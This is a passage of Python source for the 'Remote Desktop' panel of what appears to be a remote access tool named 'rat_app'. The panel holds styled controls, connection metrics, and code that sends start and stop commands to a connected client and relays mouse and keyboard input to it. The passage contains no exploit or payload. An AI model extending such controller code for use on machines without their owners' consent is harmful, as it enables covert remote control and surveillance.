        """Setup the remote desktop UI with cyberpunk styling"""
        theme = self.get_theme_colors()
        
        # Create main frame with subtle border
        self.remote_desktop_frame = ctk.CTkFrame(
            self.parent,
            fg_color=theme["bg_color"],
            border_width=1 if "border_color" in theme else 0,
            border_color=theme["border_color"] if "border_color" in theme else None,
            corner_radius=0  # Sharp corners for cyberpunk look
        )
        self.parent.add(self.remote_desktop_frame, text="Remote Desktop")
        
        # Top panel with controls and info - distinctive card styling
        self.control_panel = ctk.CTkFrame(
            self.remote_desktop_frame, 
            fg_color=theme["card_color"],
            border_width=1 if "border_color" in theme else 0,
            border_color=theme["border_color"] if "border_color" in theme else None,
            corner_radius=0  # Sharp corners
        )
        self.control_panel.pack(fill=tk.X, padx=10, pady=10)
        
        # Client info display with accent color
        client_frame = ctk.CTkFrame(self.control_panel, fg_color="transparent")
        client_frame.pack(fill=tk.X, pady=10, padx=10)
        
        client_label = ctk.CTkLabel(
            client_frame, 
            text="Connected Client:", 
            text_color=theme["accent_color"],  # Accent color for important labels
            font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                            size=FONT_STYLES["normal"][1], 
                            weight="bold")
        )
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.client_info_label = ctk.CTkLabel(
            client_frame, 
            text="None",
            text_color=theme["fg_color"]  # Normal text color for dynamic content
        )
        self.client_info_label.pack(side=tk.LEFT, padx=5)
        
        # Control port entry with neon border
        port_frame = ctk.CTkFrame(self.control_panel, fg_color="transparent")
        port_frame.pack(fill=tk.X, pady=5, padx=10)
        
        port_label = ctk.CTkLabel(
            port_frame, 
            text="Control Port:", 
            text_color=theme["accent_color"],  # Accent color for labels
            font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                            size=FONT_STYLES["normal"][1], 
                            weight="bold")
        )
        port_label.pack(side=tk.LEFT, padx=5)
        
        self.port_entry = ctk.CTkEntry(
            port_frame, 
            width=100,
            fg_color=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
            text_color=theme["fg_color"],
            border_color=theme["border_color"] if "border_color" in theme else theme["accent_color"],
            border_width=1,
            corner_radius=0  # Sharp corners
        )
        self.port_entry.pack(side=tk.LEFT, padx=5)
        self.port_entry.insert(0, "4445")  # Default control port
        
        # Control buttons with cyberpunk styling
        buttons_frame = ctk.CTkFrame(self.control_panel, fg_color="transparent")
        buttons_frame.pack(fill=tk.X, pady=10, padx=10)
        
        self.start_control_btn = ctk.CTkButton(
            buttons_frame, 
            text="Start Remote Control", 
            command=self.start_remote_control,
            fg_color=theme["accent_color"],  # Primary action gets accent color
            hover_color=theme["hover_color"],
            text_color="#000000",  # Black text for better contrast on accent color
            border_width=1,
            border_color=theme["border_color"] if "border_color" in theme else None,
            corner_radius=0  # Sharp corners
        )
        self.start_control_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_control_btn = ctk.CTkButton(
            buttons_frame, 
            text="Stop Remote Control", 
            command=self.stop_remote_control,
            state="disabled",
            fg_color=theme["danger_color"],  # Danger color for stop action
            hover_color=theme["hover_color"],
            text_color="#000000",  # Black text for better contrast
            border_width=1,
            border_color=theme["border_color"] if "border_color" in theme else None,
            corner_radius=0  # Sharp corners
        )
        self.stop_control_btn.pack(side=tk.LEFT, padx=5)
        
        # Quality and FPS settings with accent colors for sliders
        settings_frame = ctk.CTkFrame(self.control_panel, fg_color="transparent")
        settings_frame.pack(fill=tk.X, pady=5, padx=10)
        
        # Quality slider
        quality_label = ctk.CTkLabel(
            settings_frame, 
            text="Quality:", 
            text_color=theme["info_color"],  # Info color for settings labels
            font=ctk.CTkFont(family=FONT_STYLES["normal"][0], size=FONT_STYLES["normal"][1])
        )
        quality_label.pack(side=tk.LEFT, padx=5)
        
        self.quality_var = tk.IntVar(value=30)
        self.quality_slider = ctk.CTkSlider(
            settings_frame, 
            from_=1, 
            to=100, 
            variable=self.quality_var,
            width=100,
            progress_color=theme["accent_color"],  # Accent color for slider track
            button_color=theme["accent_color"],  # Accent color for slider thumb
            button_hover_color=theme["hover_color"],
            fg_color=theme["bg_color"]  # Dark background for contrast
        )
        self.quality_slider.pack(side=tk.LEFT, padx=5)
        
        self.quality_value = ctk.CTkLabel(
            settings_frame, 
            text="30",
            text_color=theme["fg_color"]
        )
        self.quality_value.pack(side=tk.LEFT, padx=5)
        
        # FPS slider
        fps_label = ctk.CTkLabel(
            settings_frame, 
            text="FPS:", 
            text_color=theme["info_color"],  # Info color for settings labels
            font=ctk.CTkFont(family=FONT_STYLES["normal"][0], size=FONT_STYLES["normal"][1])
        )
        fps_label.pack(side=tk.LEFT, padx=15)
        
        self.fps_var = tk.IntVar(value=10)
        self.fps_slider = ctk.CTkSlider(
            settings_frame, 
            from_=1, 
            to=30, 
            variable=self.fps_var,
            width=100,
            progress_color=theme["accent_color"],  # Accent color for slider track
            button_color=theme["accent_color"],  # Accent color for slider thumb
            button_hover_color=theme["hover_color"],
            fg_color=theme["bg_color"]  # Dark background for contrast
        )
        self.fps_slider.pack(side=tk.LEFT, padx=5)
        
        self.fps_value = ctk.CTkLabel(
            settings_frame, 
            text="10",
            text_color=theme["fg_color"]
        )
        self.fps_value.pack(side=tk.LEFT, padx=5)
        
        # Bind value updates
        self.quality_var.trace_add("write", self.update_quality_label)
        self.fps_var.trace_add("write", self.update_fps_label)
        
        # Add Connection Metrics Panel with cyberpunk styling
        self.metrics_frame = ctk.CTkFrame(
            self.control_panel, 
            fg_color=theme["card_color"],
            border_width=1 if "border_color" in theme else 0,
            border_color=theme["border_color"] if "border_color" in theme else None,
            corner_radius=0  # Sharp corners
        )
        self.metrics_frame.pack(fill=tk.X, pady=5, padx=10)
        
        metrics_header = ctk.CTkLabel(
            self.metrics_frame, 
            text="Connection Metrics", 
            text_color=theme["accent_color"],  # Accent color for header
            font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                            size=FONT_STYLES["normal"][1], 
                            weight="bold")
        )
        metrics_header.pack(pady=(5, 0))
        
        # Metrics display with futuristic layout
        metrics_grid = ctk.CTkFrame(self.metrics_frame, fg_color="transparent")
        metrics_grid.pack(fill=tk.X, pady=5, padx=10)
        
        # Row 1: FPS and Latency
        metrics_row1 = ctk.CTkFrame(metrics_grid, fg_color="transparent")
        metrics_row1.pack(fill=tk.X, pady=2)
        
        # FPS
        fps_metric_label = ctk.CTkLabel(
            metrics_row1, 
            text="FPS:", 
            width=80,
            text_color=theme["info_color"],  # Info color for metric labels
            font=ctk.CTkFont(family=FONT_STYLES["normal"][0], size=FONT_STYLES["normal"][1])
        )
        fps_metric_label.pack(side=tk.LEFT, padx=5)
        
        self.fps_metric_value = ctk.CTkLabel(
            metrics_row1, 
            text="0.0", 
            width=50,
            text_color=theme["fg_color"],
            font=ctk.CTkFont(family=FONT_STYLES["normal"][0], size=FONT_STYLES["normal"][1])
        )
        self.fps_metric_value.pack(side=tk.LEFT, padx=5)
        
        # Latency with warning color for critical metric
        latency_label = ctk.CTkLabel(
            metrics_row1, 
            text="Latency:", 
            width=80,
            text_color=theme["info_color"],  # Info color for metric labels
            font=ctk.CTkFont(family=FONT_STYLES["normal"][0], size=FONT_STYLES["normal"][1])
        )
        latency_label.pack(side=tk.LEFT, padx=5)
        
        self.latency_value = ctk.CTkLabel(
            metrics_row1, 
            text="0 ms", 
            width=50,
            text_color=theme["fg_color"],
            font=ctk.CTkFont(family=FONT_STYLES["normal"][0], size=FONT_STYLES["normal"][1])
        )
        self.latency_value.pack(side=tk.LEFT, padx=5)
        
        # Row 2: Bandwidth and Quality
        metrics_row2 = ctk.CTkFrame(metrics_grid, fg_color="transparent")
        metrics_row2.pack(fill=tk.X, pady=2)
        
        # Bandwidth with info color
        bandwidth_label = ctk.CTkLabel(
            metrics_row2, 
            text="Bandwidth:", 
            width=80,
            text_color=theme["info_color"],  # Info color for metric labels
            font=ctk.CTkFont(family=FONT_STYLES["normal"][0], size=FONT_STYLES["normal"][1])
        )
        bandwidth_label.pack(side=tk.LEFT, padx=5)
        
        self.bandwidth_value = ctk.CTkLabel(
            metrics_row2, 
            text="0 KB/s", 
            width=50,
            text_color=theme["fg_color"],
            font=ctk.CTkFont(family=FONT_STYLES["normal"][0], size=FONT_STYLES["normal"][1])
        )
        self.bandwidth_value.pack(side=tk.LEFT, padx=5)
        
        # Connection Quality
        quality_metric_label = ctk.CTkLabel(
            metrics_row2, 
            text="Quality:", 
            width=80,
            text_color=theme["info_color"],  # Info color for metric labels
            font=ctk.CTkFont(family=FONT_STYLES["normal"][0], size=FONT_STYLES["normal"][1])
        )
        quality_metric_label.pack(side=tk.LEFT, padx=5)
        
        self.quality_metric_value = ctk.CTkLabel(
            metrics_row2, 
            text="Unknown", 
            width=50,
            text_color=theme["fg_color"],
            font=ctk.CTkFont(family=FONT_STYLES["normal"][0], size=FONT_STYLES["normal"][1])
        )
        self.quality_metric_value.pack(side=tk.LEFT, padx=5)
        
        # Add Connection Quality Visualization with neon indicators
        quality_viz_frame = ctk.CTkFrame(self.metrics_frame, fg_color="transparent")
        quality_viz_frame.pack(fill=tk.X, pady=5)
        
        # Create 5 indicators with cyberpunk color palette
        self.quality_indicators = []
        quality_labels = ["Poor", "Fair", "Good", "Very Good", "Excellent"]
        
        # Use dedicated latency colors if available, or fall back to default theme colors
        quality_colors = [
            theme["latency_poor"] if "latency_poor" in theme else theme["danger_color"],         # Poor
            theme["latency_medium"] if "latency_medium" in theme else theme["warning_color"],    # Fair
            theme["latency_good"] if "latency_good" in theme else theme["info_color"],           # Good
            theme["accent_color"],                                                               # Very Good
            theme["latency_excellent"] if "latency_excellent" in theme else theme["success_color"] # Excellent
        ]
        
        for i in range(5):
            indicator_frame = ctk.CTkFrame(quality_viz_frame, fg_color="transparent")
            indicator_frame.pack(side=tk.LEFT, expand=True, fill=tk.X, padx=2)
            
            # Create the circle indicator with cyberpunk styling
            indicator = tk.Canvas(
                indicator_frame, 
                width=15, 
                height=15, 
                highlightthickness=0, 
                bg=theme["card_color"]
            )
            indicator.create_oval(2, 2, 13, 13, fill="#333333", outline=theme["border_color"] if "border_color" in theme else None)
            indicator.pack(side=tk.TOP)
            
            # Label below the indicator
            label = ctk.CTkLabel(
                indicator_frame, 
                text=quality_labels[i], 
                text_color=theme["fg_color"],
                font=ctk.CTkFont(family=FONT_STYLES["normal"][0], size=10)
            )
            label.pack(side=tk.TOP)
            
            self.quality_indicators.append((indicator, quality_colors[i]))
        
        # Create performance graph panel with cyberpunk styling
        self.graph_frame = ctk.CTkFrame(
            self.control_panel, 
            fg_color=theme["card_color"],
            border_width=1 if "border_color" in theme else 0,
            border_color=theme["border_color"] if "border_color" in theme else None,
            corner_radius=0  # Sharp corners
        )
        self.graph_frame.pack(fill=tk.X, pady=10, padx=10)
        
        # Create matplotlib figure for the graph with cyberpunk styling
        self.fig, self.ax = plt.subplots(figsize=(8, 2), dpi=80)
        self.fig.patch.set_facecolor(theme["card_color"])
        self.ax.set_facecolor(theme["bg_color"])
        
        # Set text colors for the plot to match theme
        for item in ['text.color', 'axes.labelcolor', 'xtick.color', 'ytick.color']:
            plt.rcParams[item] = theme["fg_color"]
        
        # Initialize plot data
        self.time_data = list(range(60))
        self.fps_data = [0] * 60
        self.latency_data = [0] * 60
        self.bandwidth_data = [0] * 60
        
        # Create line plots with cyberpunk colors
        self.fps_line, = self.ax.plot(self.time_data, self.fps_data, 
                                    color=theme["accent_color"], 
                                    label='FPS', 
                                    linewidth=1.5)
        self.latency_line, = self.ax.plot(self.time_data, self.latency_data, 
                                        color=theme["danger_color"], 
                                        label='Latency (ms/10)', 
                                        linewidth=1.5)
        self.bandwidth_line, = self.ax.plot(self.time_data, self.bandwidth_data, 
                                          color=theme["info_color"], 
                                          label='Bandwidth (KB/s)', 
                                          linewidth=1.5)
        
# Configure appearance with cyberpunk grid
        self.ax.set_xlim(0, 59)
        self.ax.set_ylim(0, 60)
        self.ax.set_xticks([])
        self.ax.legend(loc='upper right', fontsize='x-small')
        self.ax.grid(True, color=theme["secondary_color"], linestyle='--', alpha=0.3)
        self.ax.set_title("Performance Metrics", color=theme["accent_color"], fontsize=10)
        
        # Embed matplotlib figure in tkinter
        self.canvas = FigureCanvasTkAgg(self.fig, master=self.graph_frame)
        self.canvas.draw()
        self.canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)
        
        # Hide the graph frame initially
        self.graph_frame.pack_forget()
        
        # Add button to toggle graph visibility with accent color
        self.toggle_graph_btn = ctk.CTkButton(
            self.metrics_frame, 
            text="Show Performance Graph", 
            command=self.toggle_graph_visibility,
            fg_color=theme["button_color"],
            hover_color=theme["hover_color"],
            text_color=theme["fg_color"],
            border_width=1 if "border_color" in theme else 0,
            border_color=theme["border_color"] if "border_color" in theme else None,
            corner_radius=0  # Sharp corners
        )
        self.toggle_graph_btn.pack(pady=5)
        
        # Status display with colored indicator
        status_frame = ctk.CTkFrame(self.control_panel, fg_color="transparent")
        status_frame.pack(fill=tk.X, pady=5, padx=10)
        
        status_label = ctk.CTkLabel(
            status_frame, 
            text="Status:", 
            text_color=theme["accent_color"],  # Accent color for label
            font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                            size=FONT_STYLES["normal"][1], 
                            weight="bold")
        )
        status_label.pack(side=tk.LEFT, padx=5)
        
        self.status_value = ctk.CTkLabel(
            status_frame, 
            text="Inactive", 
            text_color=theme['danger_color']  # Danger color for inactive status
        )
        self.status_value.pack(side=tk.LEFT, padx=5)
        
        # Screen display area with neon border
        self.screen_frame = ctk.CTkFrame(
            self.remote_desktop_frame, 
            fg_color=theme["bg_color"],
            border_width=1,
            border_color=theme["border_color"] if "border_color" in theme else theme["accent_color"],
            corner_radius=0  # Sharp corners
        )
        self.screen_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.screen_label = tk.Label(
            self.screen_frame, 
            bg=theme["bg_color"],
            text="Remote desktop view will appear here", 
            fg=theme['fg_color']
        )
        self.screen_label.pack(fill=tk.BOTH, expand=True)
        
        # Bind mouse and keyboard events
        self.screen_label.bind("<Motion>", self.on_mouse_move)
        self.screen_label.bind("<Button-1>", lambda e: self.on_mouse_click(e, "left", "press"))
        self.screen_label.bind("<ButtonRelease-1>", lambda e: self.on_mouse_click(e, "left", "release"))
        self.screen_label.bind("<Button-3>", lambda e: self.on_mouse_click(e, "right", "press"))
        self.screen_label.bind("<ButtonRelease-3>", lambda e: self.on_mouse_click(e, "right", "release"))
        self.screen_label.bind("<Button-2>", lambda e: self.on_mouse_click(e, "middle", "press"))
        self.screen_label.bind("<ButtonRelease-2>", lambda e: self.on_mouse_click(e, "middle", "release"))
        self.screen_label.bind("<MouseWheel>", self.on_mouse_wheel)
        
        # Make screen_label focusable for keyboard events
        self.screen_label.configure(takefocus=1)
        
        # Bind keyboard events
        self.screen_label.bind("<KeyPress>", self.on_key_press)
        self.screen_label.bind("<KeyRelease>", self.on_key_release)
        
        # Start metrics update thread
        self.metrics_update_thread = threading.Thread(target=self.update_metrics_thread, daemon=True)
        self.metrics_update_thread.start()
        
        # Register with theme manager if available
        self.register_with_theme_manager()
    
    def toggle_graph_visibility(self):
        """Toggle the visibility of the performance graph"""
        theme = self.get_theme_colors()
        
        if self.graph_frame.winfo_manager():
            self.graph_frame.pack_forget()
            self.toggle_graph_btn.configure(text="Show Performance Graph")
        else:
            self.graph_frame.pack(fill=tk.X, pady=10, padx=10, before=self.control_panel.winfo_children()[-1])
            self.toggle_graph_btn.configure(text="Hide Performance Graph")
            
            # Update plot styles to match current theme
            self.fig.patch.set_facecolor(theme["card_color"])
            self.ax.set_facecolor(theme["bg_color"])
            self.fps_line.set_color(theme["accent_color"])
            self.latency_line.set_color(theme["danger_color"])
            self.bandwidth_line.set_color(theme["info_color"])
            self.ax.grid(True, color=theme["secondary_color"], linestyle='--', alpha=0.3)
            self.ax.set_title("Performance Metrics", color=theme["accent_color"], fontsize=10)
            
            # Refresh the graph
            self.update_performance_graph()
    
    def update_performance_graph(self):
        """Update the performance graph with current data"""
        if not self.graph_frame.winfo_manager():
            return  # Don't update if graph isn't visible
            
        # Update the data
        self.fps_line.set_ydata(self.fps_data)
        self.latency_line.set_ydata([min(l/10, 60) for l in self.latency_data])  # Scale latency to fit
        self.bandwidth_line.set_ydata([min(b/5, 60) for b in self.bandwidth_data])  # Scale bandwidth to fit
        
        # Redraw the canvas
        self.canvas.draw_idle()
    
    def register_with_theme_manager(self):
        """Register widgets with the theme manager if available"""
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            tm = self.rat_app.theme_manager
            
            # Register frames
            tm.track_widget(self.remote_desktop_frame)
            tm.track_widget(self.control_panel)
            tm.track_widget(self.screen_frame)
            tm.track_widget(self.graph_frame)
            
            # Register buttons
            tm.track_widget(self.start_control_btn)
            tm.track_widget(self.stop_control_btn)
            tm.track_widget(self.toggle_graph_btn)
            
            # Register labels
            tm.track_widget(self.client_info_label, "label")
            tm.track_widget(self.status_value, "label")
            tm.track_widget(self.quality_value, "label")
            tm.track_widget(self.fps_value, "label")
            tm.track_widget(self.fps_metric_value, "label")
            tm.track_widget(self.latency_value, "label")
            tm.track_widget(self.bandwidth_value, "label")
            tm.track_widget(self.quality_metric_value, "label")
            
            # Register entry
            tm.track_widget(self.port_entry)
    
    def update_quality_label(self, *args):
        """Update the quality label when the slider changes"""
        self.quality_value.configure(text=str(self.quality_var.get()))
        
    def update_fps_label(self, *args):
        """Update the FPS label when the slider changes"""
        self.fps_value.configure(text=str(self.fps_var.get()))
    
    def update_metrics_thread(self):
        """Thread function to periodically update metrics"""
        while True:
            if self.is_controlling:
                self.update_metrics()
            time.sleep(1)  # Update once per second
    
    def update_metrics(self):
        """Update the connection metrics display"""
        current_time = time.time()
        time_diff = current_time - self.last_metrics_update
        
        # Update FPS
        if self.frame_count > 0:
            current_fps = self.frame_count / time_diff
            self.fps_history.append(current_fps)
            avg_fps = sum(self.fps_history) / len(self.fps_history)
            self.fps_metric_value.configure(text=f"{avg_fps:.1f}")
            
            # Update FPS graph data
            self.fps_data.pop(0)
            self.fps_data.append(min(avg_fps, 60))  # Cap at 60 for display
        
        # Update Bandwidth
        if self.last_frame_size > 0:
            bytes_per_second = self.last_frame_size / time_diff
            kb_per_second = bytes_per_second / 1024
            self.bandwidth_history.append(kb_per_second)
            avg_bandwidth = sum(self.bandwidth_history) / len(self.bandwidth_history)
            self.bandwidth_value.configure(text=f"{avg_bandwidth:.1f} KB/s")
            
            # Update bandwidth graph data
            self.bandwidth_data.pop(0)
            self.bandwidth_data.append(avg_bandwidth)
        
        # Only update the graph if it's visible
        if self.graph_frame.winfo_manager():
            self.update_performance_graph()
        
        # Update connection quality indicators
        self.update_connection_quality()
        
        # Reset counters
        self.frame_count = 0
        self.last_frame_size = 0
        self.last_metrics_update = current_time
    
    def update_connection_quality(self):
        """Update the connection quality visualization based on current metrics"""
        theme = self.get_theme_colors()
        
        # Get average metrics
        avg_fps = sum(self.fps_history) / max(len(self.fps_history), 1)
        avg_latency = sum(self.latency_history) / max(len(self.latency_history), 1)
        avg_bandwidth = sum(self.bandwidth_history) / max(len(self.bandwidth_history), 1)
        
        # Calculate an overall quality score (0-100)
        # This is a simple heuristic and could be adjusted based on needs
        fps_score = min(avg_fps / 30 * 100, 100)  # 30 FPS = 100%
        latency_score = max(0, 100 - (avg_latency / 5) * 100)  # 0ms = 100%, 500ms = 0%
        bandwidth_score = min(avg_bandwidth / 100 * 100, 100)  # 100 KB/s = 100%
        
        # Weighted average (prioritize latency slightly)
        quality_score = (fps_score * 0.3) + (latency_score * 0.4) + (bandwidth_score * 0.3)
        
        # Determine quality level (0-4)
        if quality_score < 20:
            quality_level = 0  # Poor
            quality_text = "Poor"
        elif quality_score < 40:
            quality_level = 1  # Fair
            quality_text = "Fair"
        elif quality_score < 60:
            quality_level = 2  # Good
            quality_text = "Good"
        elif quality_score < 80:
            quality_level = 3  # Very Good
            quality_text = "Very Good"
        else:
            quality_level = 4  # Excellent
            quality_text = "Excellent"
        
        # Update the quality indicators
        for i, (indicator, color) in enumerate(self.quality_indicators):
            if i <= quality_level:
                # Active indicator with futuristic glow effect
                indicator.itemconfig(1, fill=color)
            else:
                # Inactive indicator with subtle border
                indicator.itemconfig(1, fill="#333333")
        
        # Update quality text with color matching the quality level
        quality_color = self.quality_indicators[quality_level][1] if 0 <= quality_level < len(self.quality_indicators) else theme["fg_color"]
        self.quality_metric_value.configure(text=quality_text, text_color=quality_color)
        self.connection_quality = quality_text
        self.connection_quality_level = quality_level
    
    def update_client_info(self):
        """Update the client info when a client is selected"""
        theme = self.get_theme_colors()
        
        if self.rat_app.current_client_socket:
            for addr, (client_id, conn) in self.rat_app.clients.items():
                if conn == self.rat_app.current_client_socket:
                    self.client_info_label.configure(
                        text=f"{addr[0]}:{addr[1]}",
                        text_color=theme["fg_color"]  # Normal text color for info
                    )
                    return
        
        self.client_info_label.configure(
            text="None",
            text_color=theme["danger_color"]  # Danger color for no connection
        )
    
    def update_latency(self, latency_ms):
        """Update the latency display with a new measurement"""
        theme = self.get_theme_colors()
        
        self.latency_history.append(latency_ms)
        avg_latency = sum(self.latency_history) / len(self.latency_history)
        
        # Color code the latency value based on quality thresholds
        if avg_latency < 50:  # Excellent latency
            latency_color = theme["latency_excellent"] if "latency_excellent" in theme else theme["accent_color"]
        elif avg_latency < 100:  # Good latency
            latency_color = theme["latency_good"] if "latency_good" in theme else theme["info_color"]
        elif avg_latency < 200:  # Medium latency
            latency_color = theme["latency_medium"] if "latency_medium" in theme else theme["warning_color"]
        else:  # Poor latency
            latency_color = theme["latency_poor"] if "latency_poor" in theme else theme["danger_color"]
        
        # Format latency value with color
        self.latency_value.configure(
            text=f"{avg_latency:.1f} ms",
            text_color=latency_color  # Dynamic color based on latency value
        )
        
        # Update latency graph data
        self.latency_data.pop(0)
        self.latency_data.append(avg_latency)
    
    def on_frame_received(self, frame_size):
        """Called when a new frame is received"""
        self.frame_count += 1
        self.last_frame_size = frame_size
        self.total_bytes_received += frame_size
        
        # Calculate and update latency if not done already
        current_time = time.time()
        frame_time = current_time - self.last_frame_time
        latency_ms = frame_time * 1000  # Convert to milliseconds
        self.update_latency(latency_ms)
        self.last_frame_time = current_time
    
    def start_remote_control(self):
        """Start remote desktop control session"""
        theme = self.get_theme_colors()
        
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        try:
            # First ensure we're receiving screen captures
            if not self.rat_app.receive_screenshot_trigger:
                self.rat_app.start_screen_capture()
            
            # Get control port
            try:
                self.control_port = int(self.port_entry.get())
                if self.control_port < 1024 or self.control_port > 65535:
                    raise ValueError("Port must be between 1024 and 65535")
            except ValueError as e:
                messagebox.showerror("Invalid Port", str(e))
                return
            
            # Send command to start remote desktop control
            control_command = f"START_REMOTE_DESKTOP|{self.control_port}"
            self.rat_app.current_client_socket.send(control_command.encode())
            
            # Wait for acknowledgment
            response = self.rat_app.current_client_socket.recv(1024).decode()
            
            if response.startswith("REMOTE_DESKTOP_STARTED"):
                # Extract client screen dimensions if provided
                if "|" in response:
                    dims = response.split("|")[1].split("x")
                    if len(dims) == 2:
                        self.client_width = int(dims[0])
                        self.client_height = int(dims[1])
                        self.rat_app.log(f"Client screen dimensions: {self.client_width}x{self.client_height}")
                
                # Connect to the control port
                self.connect_to_control_port()
                
                # Update UI with cyberpunk styling
                self.is_controlling = True
                self.status_value.configure(
                    text="Active", 
                    text_color=theme['success_color']  # Success color for active status
                )
                self.start_control_btn.configure(state="disabled")
                self.stop_control_btn.configure(state="normal")
                
                # Make screen_label focused to capture keyboard events
                self.screen_label.focus_set()
                
                # Update screenshot quality and FPS
                if hasattr(self.rat_app, 'SCREENSHOT_QUALITY'):
                    self.rat_app.SCREENSHOT_QUALITY = self.quality_var.get()
                if hasattr(self.rat_app, 'SCREENSHOT_INTERVAL'):
                    self.rat_app.SCREENSHOT_INTERVAL = 1.0 / self.fps_var.get()
                
                # Reset metrics
                self.frame_count = 0
                self.fps_history.clear()
                self.latency_history.clear()
                self.bandwidth_history.clear()
                self.last_frame_time = time.time()
                self.last_metrics_update = time.time()
                self.total_bytes_received = 0
                
                # Update connection quality display
                for indicator, _ in self.quality_indicators:
                    indicator.itemconfig(1, fill="#333333")
                
                # Set measuring status with accent color
                self.quality_metric_value.configure(
                    text="Measuring...",
                    text_color=theme["accent_color"]  # Accent color for measuring status
                )
                self.fps_metric_value.configure(text="0.0")
                self.latency_value.configure(text="0 ms")
                self.bandwidth_value.configure(text="0 KB/s")
                
                # Add neon border to screen frame during active session
                self.screen_frame.configure(
                    border_width=2,
                    border_color=theme["accent_color"]  # Accent color for active border
                )
                
                self.rat_app.log("Remote desktop control started")
            else:
                self.rat_app.log(f"Failed to start remote desktop control: {response}")
        
        except Exception as e:
            self.rat_app.log(f"Error starting remote desktop control: {e}")
    
    def connect_to_control_port(self):
        """Connect to the client's control port"""
        try:
            # Get client IP address
            client_ip = None
            for addr, (client_id, conn) in self.rat_app.clients.items():
                if conn == self.rat_app.current_client_socket:
                    client_ip = addr[0]
                    break
            
            if not client_ip:
                raise Exception("Could not determine client IP address")
            
            # Create socket and connect
            self.control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.control_socket.connect((client_ip, self.control_port))
            
            self.rat_app.log(f"Connected to control port {self.control_port}")
            
        except Exception as e:
            self.rat_app.log(f"Error connecting to control port: {e}")
            self.control_socket = None
    
    def stop_remote_control(self):
        """Stop remote desktop control session"""
        theme = self.get_theme_colors()
        if not self.rat_app.current_client_socket or not self.is_controlling:
            return
        
        try:
            # Send command to stop remote desktop control
            self.rat_app.current_client_socket.send(b"STOP_REMOTE_DESKTOP")
            
            # Close control socket
            if self.control_socket:
                try:
                    self.control_socket.close()
                except:
                    pass
                self.control_socket = None
            
            # Wait for acknowledgment
            try:
                response = self.rat_app.current_client_socket.recv(1024).decode()
                self.rat_app.log(f"Received stop response: {response}")
            except:
                pass
            
            # Update UI
            self.is_controlling = False
            self.status_value.configure(
                text="Inactive", 
                text_color=theme['danger_color']  # Danger color for inactive status
            )
            self.start_control_btn.configure(state="normal")
            self.stop_control_btn.configure(state="disabled")
            
            # Clear metrics displays
            self.fps_metric_value.configure(text="0.0")
            self.latency_value.configure(text="0 ms")
            self.bandwidth_value.configure(text="0 KB/s")
            self.quality_metric_value.configure(
                text="Unknown",
                text_color=theme["fg_color"]  # Normal text color for unknown status
            )
            
            # Reset quality indicators
            for indicator, _ in self.quality_indicators:
                indicator.itemconfig(1, fill="#333333")
            
            # Reset screen frame border to normal
            self.screen_frame.configure(
                border_width=1,
                border_color=theme["border_color"] if "border_color" in theme else theme["accent_color"]
            )
            
            self.rat_app.log("Remote desktop control stopped")
            
        except Exception as e:
            self.rat_app.log(f"Error stopping remote desktop control: {e}")
            self.is_controlling = False
            self.status_value.configure(
                text="Inactive", 
                text_color=theme['danger_color']
            )
            self.start_control_btn.configure(state="normal")
            self.stop_control_btn.configure(state="disabled")
    
    def on_mouse_move(self, event):
        """Handle mouse movement events"""
        if not self.is_controlling or not self.control_socket:
            return
        
        try:
            # Get the current displayed image dimensions
            image = getattr(self.screen_label, 'image', None)
            
            if image:
                try:
                    # Get actual displayed size of the widget
                    widget_width = self.screen_label.winfo_width()
                    widget_height = self.screen_label.winfo_height()
                    
                    # Get the image size
                    if hasattr(self, 'client_width') and self.client_width > 0:
                        img_width = self.client_width
                        img_height = self.client_height
                    else:
                        # Fallback if client dimensions are not known
                        img_width = widget_width
                        img_height = widget_height
                    
                    # Calculate the scaling factor
                    scale = min(widget_width / img_width, widget_height / img_height)
                    scaled_width = int(img_width * scale)
                    scaled_height = int(img_height * scale)
                    
                    # Calculate the image position within the widget (for centering)
                    img_x_offset = (widget_width - scaled_width) // 2
                    img_y_offset = (widget_height - scaled_height) // 2
                    
                    # Only send if movement is significant
                    current_pos = (event.x, event.y)
                    if self.last_pos and abs(current_pos[0] - self.last_pos[0]) < 5 and abs(current_pos[1] - self.last_pos[1]) < 5:
                        return
                    
                    self.last_pos = current_pos
                    
                    # Adjust coordinates to account for the image position
                    adjusted_x = event.x - img_x_offset
                    adjusted_y = event.y - img_y_offset
                    
                    # Check if click is within the image bounds
                    if 0 <= adjusted_x <= scaled_width and 0 <= adjusted_y <= scaled_height:
                        # Calculate relative position within the actual displayed image (0 to 1)
                        rel_x = adjusted_x / scaled_width
                        rel_y = adjusted_y / scaled_height
                        
                        # Ensure values are within 0-1 range
                        rel_x = min(max(rel_x, 0), 1)
                        rel_y = min(max(rel_y, 0), 1)
                        
                        # Send command to client with a terminator
                        command = f"MOUSE_MOVE|{rel_x:.6f}|{rel_y:.6f}\n"
                        self.control_socket.send(command.encode())
                        
                        # Measure latency - start time
                        start_time = time.time()
                        
                        # Wait for acknowledgment
                        try:
                            self.control_socket.settimeout(0.1)  # Short timeout
                            self.control_socket.recv(1024)
                            
                            # Measure latency - end time and update
                            latency_ms = (time.time() - start_time) * 1000
                            # Only update metrics occasionally to avoid overloading the UI
                            if random.random() < 0.1:  # ~10% of movements
                                self.update_latency(latency_ms)
                                
                            self.control_socket.settimeout(None)
                        except socket.timeout:
                            pass  # This is ok for mouse movements
                except Exception as e:
                    self.rat_app.log(f"Error calculating mouse position: {e}")
        
        except Exception as e:
            self.rat_app.log(f"Error sending mouse movement: {e}")
            
            
    def on_mouse_wheel(self, event):
            """Handle mouse wheel events"""
            if not self.is_controlling or not self.control_socket:
                return
            
            try:
                # Windows uses event.delta, which is usually a multiple of 120
                # Convert to a reasonable scroll amount
                scroll_amount = event.delta // 120
                
                # Measure latency start
                start_time = time.time()
                
                # Send command to client
                command = f"MOUSE_SCROLL|{scroll_amount}\n"
                self.control_socket.send(command.encode())
                
                # Wait for acknowledgment
